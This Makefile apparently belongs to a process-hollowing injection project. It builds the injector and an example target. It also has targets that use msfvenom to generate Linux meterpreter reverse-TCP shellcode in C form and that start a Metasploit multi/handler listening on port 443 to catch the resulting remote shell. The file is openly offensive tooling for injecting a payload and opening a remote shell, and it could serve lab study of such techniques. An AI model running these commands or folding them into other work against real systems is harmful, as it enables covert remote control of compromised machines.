build:
	rm -f hollowing
	gcc -o hollowing main.c

example:
	rm -f example
	gcc -o example example.c -Os -lm	

listen-example:
	sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 443; exploit"

shellcode:
	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f c

clean:
	rm -f hollowing
	rm -f example
